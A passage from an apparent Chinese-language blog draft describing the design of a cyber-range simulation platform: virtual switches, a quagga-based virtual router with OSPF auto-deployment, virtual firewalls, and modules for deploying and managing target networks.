"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227024942.jpeg" alt="D:\\1.CyberSecurity\\文档修改\\六所靶场\\工业互联网安全开发测试基础共性服务平台项目场景导调与模拟仿真系统\\431521-20171224101134818-1527791519.jpg"></p><p>虚拟交换机原理</p><p>每个vSwitch都有两种接口，上联口和下联口。上联口用来连接物理网卡，每个上联口绑定一个物理网卡。一个vSwitch至少要有一个上联口，多个上联口可以进行捆绑。上联口可以配置IP地址，方便进行管理操作。下联口用于连接虚拟机，每个下联口连接一台虚拟机。与物理交换机不同的是，vSwitch下联口不会自动学习MAC地址，都是静态绑定的。上联口的IP和虚拟机的IP没有必然的关系，可以配置为不同的网段。</p><p>虚拟交换机支持二层交换机和三层交换机镜像。模拟仿真系统支持VLAN、VXLAN两种组网模式，支持租户之间地址重叠。</p><p>支持绘制仿真二层交换机，配置的参数包括交换机基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；网络信息，名称、所属网络、所属设备、传递设备、子网个数、状态（是否允许设备间传递）等信息；子网信息，子网名称、所属网络、所属Vlan、所属设备以及子网基本信息CIDR、网关、DNS等信息。</p><p>支持绘制仿真三层交换机，配置的参数包括交换机基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；网络信息，名称、所属网络、所属设备、传递设备、子网个数、状态（是否允许设备间传递）等信息；子网信息，子网名称、所属网络、所属Vlan、所属设备以及子网基本信息CIDR、网关、DNS等信息；可设置虚拟网络访问外部网络并支持指定IP。</p><p>网络策略模板：是对下联口和虚拟机的一些操作，可以对下联口进行出入方向的流量进行限制，规划下联口所属VLAN，设置VSI和应用ACL策略。缺省情况下，没有对下联口进行流控，端口所属VLAN为0（即数据包不带VLAN Tag）。</p><p>虚拟交换机内置DHCP服务器，支持为连接到该虚拟交换机的虚拟机分配IP地址、子网掩码、默认网关、DNS地址等网络参数，支持以图形化的方式展示DHCP地址池的IP地址分配情况。</p><p>网络拓扑构建功能可实现层次化端口绑定功能，可有效突破4K可用VLAN的限制。</p><h5 id="使用vswitch构建虚拟网络"><a href="#使用vswitch构建虚拟网络" class="headerlink" title="使用vswitch构建虚拟网络"></a>使用vswitch构建虚拟网络</h5><p>构建物理机和物理机相互连接的网络：在安装vswitch的主机上有两块网卡，分别为eth0、eth1，把这两块网卡挂接到vswitch的网桥上，然后有两台物理机host1、host2分别连接到eth0和eth1上，实现这两台物理机的通信，构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227024953.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE2.jpeg"></p><p>物理机和物理机相互连接</p><h5 id="构建虚拟机与虚拟机相连的网络"><a href="#构建虚拟机与虚拟机相连的网络" class="headerlink" title="构建虚拟机与虚拟机相连的网络"></a>构建虚拟机与虚拟机相连的网络</h5><p>在安装vswitch的主机上安装两个虚拟机，把两个虚拟机的网卡都挂接在vswitch的网桥上，实现两台虚拟机的通信，构建结果所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025000.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE3.jpeg"></p><p>虚拟机相连</p><h5 id="构建虚拟机与物理机相连的网络"><a href="#构建虚拟机与物理机相连的网络" class="headerlink" title="构建虚拟机与物理机相连的网络"></a>构建虚拟机与物理机相连的网络</h5><p>在装有vswitch的主机上有一个物理网卡eth0，一台主机通过网线和eth0相连，在open vswitch的主机上还装有一台虚拟机，把此虚拟机和连接到eth0的主机挂接到同一个网桥上，实现两者之间的通信，构建结果如所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025006.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE4.jpeg"></p><p>虚拟机物理机相连</p><p>构建网桥和网桥相连的网络：以上操作都是将多个主机（物理机或虚拟机）连接到同一个网桥上，实现它们之间的通信，但是要构建复杂的网络，就需要多个网桥，在装有vswitch的主机上建立两个网桥，实现它们之间的连接，构建结果如所示：<br> <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025018.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE5.jpeg"></p><p>网桥相连</p><h5 id="在不同的主机之间构建网桥之间的连接"><a href="#在不同的主机之间构建网桥之间的连接" class="headerlink" title="在不同的主机之间构建网桥之间的连接"></a>在不同的主机之间构建网桥之间的连接</h5><p>在两台机器上分别安装上vswitch并创建网桥，分别为两个网桥添加物理网卡，然后通过网线连接两个网桥，实现两个网桥之间的互通。构建结果如所示：<br> <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025056.jpeg" alt="https://img1.sdnlab.com/wp-content/uploads/2015/12/OVS%E5%88%9D%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8open%20vswitch%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%20%E5%9B%BE6.jpeg"></p><p>两台机器网桥创建</p><p>使用上边五种方法的组合就可以构建出各种复杂的网络，为各种实验提供网络的支持。</p><p>ACL策略：与物理交换机的有些不同，在功能上有一定的限制。ACL策略能对流量进行基于目的IP的包过滤，因为下联口只有一台虚拟机，所以根本不需要基于源IP的规则。ACL支持基于ICMP、TCP和UDP协议进行操作。ACL策略应用于下联口的入方向。</p><p>网络策略模板：是对下联口和虚拟机的一些操作，可以对下联口进行出入方向的流量进行限制，规划下联口所属VLAN，设置VSI和应用ACL策略。缺省情况下，没有对下联口进行流控，端口所属VLAN为0（即数据包不带VLAN Tag）。</p><p>虚拟交换机内置DHCP服务器，支持为连接到该虚拟交换机的虚拟机分配IP地址、子网掩码、默认网关、DNS地址等网络参数，支持以图形化的方式展示DHCP地址池的IP地址分配情况。</p><h4 id="虚拟路由器"><a href="#虚拟路由器" class="headerlink" title="虚拟路由器"></a>虚拟路由器</h4><p>虚拟路由器即Virtual Router，是指在软、硬件层实现物理路由器的功能仿真，属于一种逻辑设备。它在软件中复制基于硬件的第3层Internet协议（IP）路由的功能。虚拟路由是网络功能虚拟化(NFV)的一种形式，它将传统的基于硬件的网络设备的功能转换为软件，而不是在标准的商用现货(COTS)硬件上运行。这样能够降低硬件成本，并且有助于实现硬件互操作性，且无需专用硬件平台。</p><h5 id="虚拟路由器特性"><a href="#虚拟路由器特性" class="headerlink" title="虚拟路由器特性"></a>虚拟路由器特性</h5><p>由于虚拟路由将IP路由功能从特定的硬件中释放出来，这意味着路由功能可以更自由地在网络或数据中心周围移动。在基本的软件路由功能中，路由软件被添加到商品服务器中，使该硬件成为路由器。在更复杂的分布式路由环境中，路由软件的各个部分可以在整个网络中移动，同时使用集中控制平面进行管理。</p><p>我们可以提供一个自动化的路由器配置接口，以实现对路由器的动态配置和管理。通过此接口，用户可以进行静态路由配置，包括目的网络、下一跳信息和出接口等。还可以配置各种动态路由协议，如RIP、OSPF、BGP、IS-IS、IGRP等，通过设置相关参数来实现动态路由功能。另外，用户可以设置优先级，以确定路由选择的顺序和权重，确保网络流量的优化。同时，接口还支持包过滤设置，允许或阻止特定类型的数据包通过路由器，实现对流量的精细控制。最后，拥塞控制功能也可以通过接口进行配置，以确保在高负载情况下路由器能够进行流量管理和调控。通过提供这样的自动化配置接口，路由器的管理和调整变得更加方便和灵活，满足不同网络环境和需求的路由器配置要求。也可支持DNS、NAT网关、QoS等网络服务。可查看VPC网络的ID/名称、状态、IPv4 CIDR、IPv6 CIDR、私有网络、防火墙、外部网关、私网域名、组织等信息。</p><p>每个虚拟路由器应该具有逻辑独立的路由表和转发表，这样就使不同VPN间的地址空间可以重用，并保证了VPN内部路由和转发的隔离性。虚拟路由器具备以下特征：</p><p>高度仿真：进入系统后，应当具备与真实路由器相同的外观，相同的命令录入界面和相同的输出提示等，使学生通过练习熟悉后，将来即使第一次接触真实路由器也能够正确配置与使用。</p><p>满足实验室的特征：该系统应当具备练习模块和考试模块，学生通过自己的学号和密码登陆后，进入练习模块做实验，界面有实验目的、实验要求、练习中有操作提示等，完成后记录；进入考试模块，根据要求完成实验考试，完成后记录成绩；教师有专用管理模块，可以查看学生的练习和考试情况。</p><p>具备分布特征：该系统可使学生在规定的时间内在不同的地点完成自己应当做的练习和考试，由于采用D E 0 模式，学生用户和教师用户都不需要维护该系统，只要保证网络畅通即可。</p><p>虚拟路由器关键性能：支持对租户虚拟路由器进行管理，包括接口/子网、外部网络、路由信息、BGP对等体等进行管理。</p><h5 id="虚拟路由器安装"><a href="#虚拟路由器安装" class="headerlink" title="虚拟路由器安装"></a>虚拟路由器安装</h5><p>全虚拟化路由器:全虚拟化路由器基于KVM虚拟机为原型，通过搭载quagga实现路由功能，并重新打包成虚拟路由器镜像。基于该虚拟路由器镜像，用户可以登录到路由器系统，通过查看配置手册，根据当前网络场景手动配置动态路由协议实现云计算中逼真的三层网络拓扑。同时，通过python设计了基于OSPF协议的可自动部署程序，能够使得该虚拟路由器镜像启动后可自行探测接口信息，并调用配置接口完成路由协议的自动部署。经过典型网络场景测试，该路由器能够在IPv4协议下完成多路由器节点间的动态、静态路由支持。</p><p>1.在搭建成功的openstack平台中，启动一台虚拟机，配置floating ip，使其能够上网，然后安装quagga软件。</p><p>安装过程和简单使用： <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025106.png"></p><p>安装流程1</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/19c5185f935f9984f775a378294e27de.png"></p><p>安装流程2</p><p>完成以上步骤可以手动配置协议。</p><p>2.编写自动配置代码：</p><p>代码结构如下：实现了基于OSPF协议的自动部署虚拟路由器。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227025122.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/53398176f00ce80c551ab5413908ca55.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c57a6852e089cf5038941276f0e77c0a.png"></p><p>编写自动配置代码</p><p>3.编写Web服务，提供远程查询路由表服务：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/60775a8c7b0910b873cf0a9eb3d80c0b.png"></p><p>编写Web服务</p><p>该服务可远程查询路由器路由表，接口网络命名空间使用<a href="http://ip:4501/route">http://ip:4501/route</a></p><p>4.设置部署代码开机自动执行</p><p>配置/etc/rc.local文件</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4c5f6b8cd6b04f850776059762fd6f08.png"></p><p>local文件</p><p>该文件所做工作为：开机启动时启动zebra,ospf服务，并执行配置程序，最后启动一个web服务，用于远程查询该路由器的路由表。</p><p>5.至此，虚拟路由器开发完成，需要将该实例打包成新的路由器镜像。打包镜像的文档在附件里。打包后镜像，可上传到任一openstack使用。</p><p>轻量级虚拟化路由器：基于Docker原生操作系统级镜像，借助OSPF协议与BGP协议的路由原则，利用路由软件技术，设计开发实现轻量级虚拟化路由器软件，并利用Dockerfile将该软件制作为轻量级虚拟化路由器软件镜像。其可实现OSPF协议、BGP协议的动态路由协议仿真，配置命令与真实路由器相似。</p><h5 id="虚拟路由器拥塞控制、优先级设置"><a href="#虚拟路由器拥塞控制、优先级设置" class="headerlink" title="虚拟路由器拥塞控制、优先级设置"></a>虚拟路由器拥塞控制、优先级设置</h5><p>全虚拟化技术在操作系统和底层硬件之间使用一个软件中间层来管理底层硬件资源，当客户操作系统执行某项指令时，软件中间层将接管该段代码，并执行对应的操作，这就使得操作系统可以拥有独立的内核，在逼真性上相较于其他虚拟化技术有巨大优势。全虚拟化技术的代表有VMware和KVM，由于OpenStack对KVM技术具有良好的亲和性，并且其能够仿真出逼真度极高的虚拟节点，所以我们采用KVM技术来实现路由仿真的虚拟化平面。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/bcc3b7d256b0fae331af8261231bab84.png"></p><p>软件中间层管理底层硬件资源</p><p>全虚拟化技术在操作系统和底层硬件之间使用一个软件中间层来管理底层硬件资源，当客户操作系统执行某项指令时，软件中间层将接管该段代码，并执行对应的操作，这就使得操作系统可以拥有独立的内核，在逼真性上相较于其他虚拟化技术有巨大优势。全虚拟化技术的代表有VMware和KVM，由于OpenStack对KVM技术具有良好的亲和性，并且其能够仿真出逼真度极高的虚拟节点，所以我们采用KVM技术来实现路由仿真的虚拟化平面。</p><p>在路由仿真的控制平面上我们采用可扩展的模块化软件路由器来实现路由仿真中对多种路由协议的支持。软件路由器分为三个部分，分别为路由表、路由表控制器和路由协议模块。路由表为操作系统内核中的routing table，所有报文依据路由表中的路由条目进行转发，是路由器的实现基础。路由表控制器将路由协议模块计算出的路由表项写入内核路由表中，是连接路由表和路由协议模块的纽带。路由协议模块实现对具体路由协议的支持，如RIP、OSPF、BGP等，并负责路由发现、路由计算等功能，是实现路由控制的关键。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/21748e0bb578b4552b63662522d27fde.png"></p><p>拥塞控制模块</p><p>拥塞控制模块包括队列管理模块、缓冲队列模块和延迟模块。队列管理模块负责处理数据链路层交付下来的报文，决定报文是进入缓冲队列模块还是被丢弃，为了保证虚拟路由器在拥塞控制上的逼真性，我们采用实物路由器中常见的弃尾（Droptail）算法作为报文队列管理算法。缓冲队列模块实现了一个FIFO报文队列，队列长度可自由定义，待出队的报文在其中进行出队前的排队操作。延迟模块负责对出队列的报文进行延迟操作，仿真出报文在队列中的排队延迟。</p><p>延迟模块设计如下:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/80e3048e8cab0e64176e0b02b3d894c2.png"></p><p>延时模块</p><p>报文从缓冲队列模块到达延迟模块中的报文暂存模块后，延迟模块的计时器从控制器中获取延迟时间。延迟模块中的计时器进入计时状态，根据延迟时间开始计时。当时间达到设定的延迟时间后，报文从延迟模块中离开交付为物理层。</p><h4 id="虚拟防火墙"><a href="#虚拟防火墙" class="headerlink" title="虚拟防火墙"></a>虚拟防火墙</h4><p>虚拟防火墙在虚拟化环境中承担着与实物防火墙类似的功能，并提供了基本的配置选项来定义防火墙的规则策略。配置防火墙规则时，可以包括目的地址IP、源IP、目的端口、源端口、协议类型以及动作（拒绝/允许）等参数。通过这些参数的配置，可以对进出虚拟防火墙的流量进行精细控制和过滤，确保网络安全的同时实现流量的合法传输。1、配置不同vsys中的相关安全策略，安全策略各自独立，互不影响。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4fb86ba4690e9cb9c11242b6ac09d3db.jpeg" alt="安全策略各自独立"></p><p>安全策略各自独立</p><p>2、配置不同vsys的管理员账户，管理员登陆后可单独管理私有的防火墙配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a72beced69cee4bef4754de15b66be4e.jpeg" alt="防火墙配置"></p><p>防火墙配置</p><p>3、 应用配置生效</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f200892e100db80482710705702a00f1.jpeg" alt="应用配置生效"></p><p>应用配置生效</p><h4 id="虚拟服务器-客户端-车载零部件"><a href="#虚拟服务器-客户端-车载零部件" class="headerlink" title="虚拟服务器/客户端/车载零部件"></a>虚拟服务器/客户端/车载零部件</h4><p>在虚拟化环境中，可以进行虚拟服务器、客户端主机和车载零部件的仿真配置，其中包括KVM虚拟机、基于容器的Docker主机及车机、tbox、网关。支持目前主流的window操作系统和linux操作系统。客户可通过web界面登录。每个虚拟防火墙系统都可以被看成是一台完全独立的防火墙设备，可拥有独立的系统资源、管理员、安全策略、用户认证数据库等。</p><p>支持绘制仿真虚拟主机，配置的参数包括虚拟主机的基础信息，名称、图标类型（系统默认、自定义）、所属势力方、自定义描述内容、自定义属性；配置属性，包括镜像、配额、可用域等信息。</p><p>系统提供了根据镜像名称、操作系统类型（Linux、Windows、Macos、Unix）、镜像权限(私有、共享、公共)、虚拟化类型（KVM、Docker、WMware）、设备类型等多种条件进行过滤。并根据选择的镜像的磁盘配额信息自动过滤出符合要求的配额模板列表。支持根据所选镜像自动过滤出符合要求的可用域。如docker部署在docker域。配置端口信息系统提供了自动生成（自动避免IP冲突）和手动配置两种方式。</p><p>虚拟系统的特点：</p><p>每个虚拟系统由独立的管理员进行管理，使得多个虚拟系统的管理更加清晰简单，所以非常适合大规模的组网环境。</p><p>每个虚拟系统拥有独立的配置及路由表项，这使得虚拟系统下的局域网即使使用了相同的地址范围，仍然可以正常进行通信。</p><p>可以为每个虚拟系统分配固定的系统资源，保证不会因为一个虚拟系统的业务繁忙而影响其他虚拟系统。</p><p>虚拟系统之间的流量相互隔离，更加安全。在需要的时候，虚拟系统之间也可以进行安全互访。</p><p>虚拟系统实现了硬件资源的有效利用，节约了空间、能耗以及管理成本。</p><p>具体配置如下：</p><p>1、 创建vsys、vrouter并做两者之间的关联</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6d69c35dbd5f2d1361225441e109fef3.jpeg" alt="vrouter"></p><p>vrouter</p><p>2、 配置三层接口，路属于不同的vsys并绑定在vrouter上</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c49e4bdfb5d1ed48c8b79dd1056767c0.jpeg" alt="三层接口"></p><p>三层接口</p><p>Vrouter和接口都属于虚拟系统的资源，可被分配到不同虚拟系统上，vrouter可以被多个虚拟系统共享也可单独占有，接口只能被唯一一个虚拟系统占有。<br> Vrouter和vswitch不单单属于虚拟系统的资源和被占用，它们也是网络的一种部署，代表了虚拟系统中的二层或三层的网络转发。</p><p>3、 配置不同vsys上外网的路由条目</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0aa2758491496e0003405097c23eb89d.jpeg" alt="vsys"></p><p>vsys</p><p>4、 配置不同vsys中的SNAT的策略，策略独立</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7418bcea77a058ca28720763a3d685d1.jpeg" alt="SNAT"></p><p>SNAT</p><h2 id="目标网络调度模块"><a href="#目标网络调度模块" class="headerlink" title="目标网络调度模块"></a>目标网络调度模块</h2><p>需具备根据配置的目标网络信息进行部署功能，支持对X86架构虚拟机、ARM架构虚拟机、容器、实物设备进行统一的部署，构建虚实结合的目标网络，支持设置链路带宽、延迟和丢包率等详细链路特性，用于模拟不同链路质量的汽车通信链路情况包括车云通信、V2X、车载以太网等；支持在部署好的目标网络环境进行增量部署，增量部署支持对设备进行删除、更新和增加操作，并且增量部署不影响其他节点；支持对部署过程进行监控和展示，包括部署的各类节点总数、各类节点进度、部署错误的类型进行展示，显示进行中、等待中、失败和成功的具体节点和数量，对于部署失败的节点，系统给出失败原因。</p><p>针对以上描述的功能需求，可以采用以下视图方式来展开详细描述：</p><p>目标网络部署功能是一个非常强大且灵活的平台，它可以根据用户配置的目标网络信息进行部署，支持对各种虚拟机、容器和实物设备进行统一的部署。无论是基于X86架构还是ARM架构的虚拟机，或者是容器化的应用程序，甚至是实际的物理设备，都可以通过该平台进行部署和管理。</p><p>该功能的主要特点之一是能够构建虚实结合的目标网络。在实际的汽车通信环境中，不同的链路质量对通信性能有着重要影响。因此，目标网络部署功能支持设置链路带宽、延迟和丢包率等详细链路特性，以模拟不同链路质量的汽车通信链路情况。这包括了车与云端的通信、车辆之间的V2X通信以及车载以太网等多种场景，用户可以根据实际需求进行配置和模拟，以便更好地评估和测试系统的性能和稳定性。</p><p>除了能够进行整体的目标网络部署外，该平台还支持增量部署。增量部署意味着用户可以对已经部署好的目标网络环境进行删除、更新和增加操作，而不会影响到其他节点的正常运行。这为用户提供了更大的灵活性，可以根据实际需求对目标网络进行动态调整和优化，而无需重新部署整个网络。</p><p>在部署过程中，该功能还提供了监控和展示的功能。用户可以实时监控部署的进度和状态，包括各类节点的总数、进度以及可能出现的错误类型。通过直观的界面展示，用户可以清晰地了解部署的情况，同时也能够快速定位和解决可能出现的问题。具体的展示内容包括进行中、等待中、失败和成功的具体节点和数量等信息，对于部署失败的节点，系统会给出相应的失败原因，帮助用户快速排查和修复。</p><p>总之，目标网络部署功能是一个强大而灵活的平台，它可以根据用户的需要进行各种设备的统一部署，并支持链路特性的配置和模拟。通过增量部署和监控展示的功能，用户能够更好地管理和优化目标网络，提高系统的性能和稳定性。该功能的应用范围广泛，不仅适用于汽车通信领域，也可应用于其他需要对目标网络进行部署和管理的领域。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/daa1cf5b6085d83581a28c0fbec32dae.png"></p><p>功能参数设计为具备全面的资源调度能力。这包括对虚拟节点计算资源和存储资源的有效调度，以及虚拟网络资源（如IP地址、端口、链路）的灵活配置。此外，系统还具备对实物设备资源（包括实物网络设备、安全设备和计算设备）的调度功能，确保资源得到最优化利用。同时，系统提供了针对试验场景所需各类资源的计算调度功能，能够自动检测底层资源的充足程度，并对不满足的资源进行提示。此外，系统还具备根据配置的目标网络信息进行部署的能力，支持对X86架构虚拟机、ARM架构虚拟机、容器以及实物设备的统一部署。它能够构建虚实结合的目标网络，并支持设置详细的链路特性，如链路带宽、延迟和丢包率，用于模拟不同的汽车通信链路情况。系统还支持在已部署的网络环境中进行增量部署，包括设备的删除、更新和增加操作，同时确保这些操作不会影响其他节点。系统还提供了对部署过程的监控和展示功能，能够展示各类节点的总数、进度、以及部署错误的类型，并对部署失败的节点给出具体的失败原因。</p><p>性能参数设计为支持高效的节点部署和调度。系统能够支持最多2000个节点的同时部署调度，确保在大规模的测试环境中保持高效运行。此外，系统还支持单一拓扑的增量部署次数达到20次，能够记录每次部署的详细信息，包括各次部署的配置、变更和结果，从而为用户提供丰富的操作记录和数据分析基础。</p><p>1. 部署配置视图：</p><p>功能参数如下：提供一个配置界面，允许用户根据目标网络信息进行配置。用户可以指定目标网络的拓扑结构、节点类型和数量等信息。</p><p>功能参数如下：支持选择不同架构的虚拟机（X86架构和ARM架构）、容器和实物设备进行部署。用户可以根据实际需求选择适合的部署方式。</p><p>功能参数如下：具备设置链路带宽、延迟和丢包率等详细链路特性的功能。用户可以根据需要模拟不同链路质量的汽车通信链路情况，如车云通信、V2X和车载以太网等。</p><p>2. 增量部署视图：</p><p>功能参数如下：提供增量部署功能，允许用户对已部署的目标网络环境进行删除、更新和增加操作，而不影响其他节点的正常运行。</p><p>功能参数如下：支持对设备进行删除、更新和增加操作的界面，用户可以选择要操作的设备，并执行相应的操作。系统会自动处理设备之间的依赖关系。</p><p>3. 部署监控和展示视图：</p><p>功能参数如下：提供一个监控和展示界面，用于实时监控部署过程和展示相关信息。</p><p>功能参数如下：显示部署的各类节点总数和进度，用户可以清晰地了解整个部署过程的进展情况。</p><p>功能参数如下：展示部署错误的类型和失败节点的详细信息，系统会给出失败原因和相应的错误提示，便于用户进行故障排查和修复。</p><p>通过以上视图方式，用户可以方便地配置目标网络信息、进行增量部署操作，并实时监控和展示部署过程的状态和结果。这样的系统设计可以提高部署的灵活性和效率，同时减少对其他节点的影响，从而更好地满足XXXX的需求。</p><p>设计和实现一个资源调度和部署系统，用于管理和分配虚拟节点资源、虚拟网络资源、实物设备资源，并能够在试验场景中进行有效的资源计算调度，同时支持目标网络的部署和增量更新。</p><p>方案概述</p><ol><li>资源调度系统设计</li></ol><p>虚拟资源调度：实现一个虚拟资源管理器，负责虚拟节点的计算资源和存储资源的调度。</p><p>虚拟网络资源调度：设计虚拟网络资源管理器，负责IP地址管理、端口分配和虚拟链路的建立与维护。</p><p>实物资源调度：构建实物资源管理器，用于管理实体网络设备、安全设备和计算设备的资源分配。</p><ol><li>资源充足性计算</li></ol><p>资源需求计算：开发资源需求评估模块，用以评估试验场景所需资源，并计算底层资源充足性。</p><p>资源不足提示：当资源不满足要求时，系统应提供明确的提示信息。</p><ol><li>目标网络部署</li></ol><p>部署引擎设计：开发一个部署引擎，支持根据配置目标网络信息进行虚拟机、容器和实物设备的统一部署。</p><p>链路特性设置：在部署模块中，允许用户设置链路带宽、延迟、丢包率等，以模拟不同的通信链路质量。</p><p>增量部署与更新：实现增量部署功能，支持设备的删除、更新和增加操作，且不影响其他节点的运行。</p><p>部署监控与展示：设立一个监控中心，用于实时监控部署过程，并展示部署进度和状态。</p><ol><li>性能参数满足</li></ol><p>大规模部署能力：确保系统支持不低于2000个节点的同时部署调度。</p><p>增量部署记录：系统应能够记录单一拓扑的增量部署次数（不低于20次）和详细的部署记录。</p><ol><li>需求分析与规划</li></ol><p>分析试验场景的资源需求。</p><p>规划资源管理架构。</p><p>系统开发：</p><p>开发虚拟资源管理器、虚拟网络资源管理器和实物资源管理器。</p><p>实现资源充足性计算模块。</p><p>编写部署引擎和增量更新逻辑。</p><p>设计部署监控界面。</p><ol><li>测试与优化</li></ol><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><ol><li>部署与监控</li></ol><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><p>编程语言：使用高性能的编程语言如Go或Rust，提高并发处理能力。</p><p>数据库：采用高可用性和可扩展性的数据库系统，如PostgreSQL或MongoDB。</p><p>虚拟化技术：使用KVM、Docker等成熟的虚拟化技术。</p><p>网络虚拟化：使用Open vSwitch等工具进行网络资源的虚拟化和调度。</p><p>监控工具：集成Prometheus、Grafana等监控工具进行系统监控。</p><p>自动化部署：使用Ansible、Terraform等自动化部署工具。</p><ol><li>预期结果</li></ol><p>成功实现一个高效、可靠的资源调度和部署系统。</p><p>满足高并发部署的性能要求，确保系统稳定运行。</p><p>实现对复杂网络环境的快速部署和灵活调整。</p><h2 id="目标网络管理模块"><a href="#目标网络管理模块" class="headerlink" title="目标网络管理模块"></a>目标网络管理模块</h2><ul><li>提供部署完成的目标网络进行管理控制功能，包括虚拟节点的启动、停止、重启、设置密码、重建、端口转发等功能，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f3aa487b32db48d293bbc86979deba96.png" alt="WPS图片(11)"></p><ul><li>提供虚拟化节点、容器节点和实物节点的无差异Web接入操作，为目标网络设计和试验提供操作入口，接入的方式能够支持SSH、RDP和VNC等远程协议类型不少于3种，支持文件上传和下载操作，支持对操作的过程进行录屏，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/43778405f5b5207f58ae1c19f956d513.png" alt="WPS图片(3)"></p><ul><li>支持同时不低于200人接入操作，并且支持扩展实现更多人的接入扩展需求，提供产品功能截图证明，截图中需包含明确的接入数量并清晰识别。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/80d01887e46e42241d514649e62f72af.png" 